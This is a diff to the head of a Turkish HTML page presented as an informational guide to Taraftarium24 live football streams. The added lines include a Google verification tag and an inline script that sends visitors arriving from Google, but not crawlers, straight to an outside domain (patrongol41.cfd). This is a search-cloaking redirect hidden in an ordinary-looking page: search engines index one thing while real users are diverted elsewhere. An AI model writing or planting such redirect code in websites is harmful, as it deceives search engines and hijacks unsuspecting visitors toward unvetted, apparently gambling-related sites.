@@ -1,7 +1,21 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+  <meta name="google-site-verification" content="gj57c1PBR-jEehASv_SNgKw0XeDYQRNv2TSePlcssJI" />
+  
 <meta charset="utf-8">
+   <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patrongol41.cfd");
+    }  
+</script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Taraftarium24 - Taraftarium Lig Maçlarını Canlı İzle - Taraftarium 24 Derbi ve Normal Maç İzle 2026</title>
 <meta name="description" content="Taraftarium24 ile lig maçlarını, derbi karşılaşmalarını ve normal maç yayınlarını canlı izlemek için güncel adres kontrolü, mobil kullanım ve resmî kanal doğrulama üzerine sade, bağımsız bilgilendirme notları sunar.">
